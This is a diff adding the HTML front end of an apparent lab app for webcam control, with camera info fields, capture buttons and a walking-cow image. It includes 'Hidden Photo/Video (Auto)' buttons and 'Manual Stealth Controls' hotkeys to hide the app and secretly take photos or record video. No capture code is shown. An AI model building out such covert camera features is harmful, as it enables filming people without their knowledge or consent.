@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>LAB4: WEBCAM</title>
+    <link rel="stylesheet" href="lab4.css">
+    <style>
+        .hotkey-info {
+            background: rgba(0,0,0,0.6);
+            color: #fff;
+            padding: 10px;
+            margin-top: 10px;
+            border-radius: 4px;
+            font-family: monospace;
+            font-size: 0.9em;
+            text-align: left;
+        }
+        .hotkey-info span {
+            color: #4CAF50;
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+    <div class="lab">
+        <div class="title">WEBCAM</div>
+        
+        <div class="info-grid">
+            <div class="info-item">
+                <span class="info-label">Camera Name:</span>
+                <span id="cameraName" class="info-value">Loading...</span>
+            </div>
+            <div class="info-item">
+                <span class="info-label">Camera Status:</span>
+                <span id="cameraStatus" class="info-value">Loading...</span>
+            </div>
+            <div class="info-item">
+                <span class="info-label">Resolution:</span>
+                <span id="cameraResolution" class="info-value">Loading...</span>
+            </div>
+            <div class="info-item">
+                <span class="info-label">FPS:</span>
+                <span id="cameraFPS" class="info-value">Loading...</span>
+            </div>
+        </div>
+
+        <div class="controls-grid">
+            <button id="capturePhotoBtn" class="mc-button">Capture Photo</button>
+            <button id="captureVideoBtn" class="mc-button">Capture Video</button>
+            <button id="hiddenPhotoBtn" class="mc-button">Hidden Photo (Auto)</button>
+            <button id="hiddenVideoBtn" class="mc-button">Hidden Video (Auto)</button>
+            <button id="refreshBtn" class="mc-button">Refresh Info</button>
+            <a href="../startup/index.html"><button class="mc-button">Back</button></a>
+        </div>
+
+        <div class="hotkey-info">
+            <div><strong>Manual Stealth Controls:</strong></div>
+            <div><span>F8</span> : Toggle App Visibility (Hide/Show)</div>
+            <div><span>F9</span> : Take Hidden Photo</div>
+            <div><span>F10</span>: Record Hidden Video (5s)</div>
+        </div>
+
+        <div id="statusMessage" class="status-message"></div>
+    </div>
+    <img src="../../public/cowalk.gif" alt="walking cow" id="cow-walk">
+    <script src="lab4.js"></script>
+</body>
+</html>
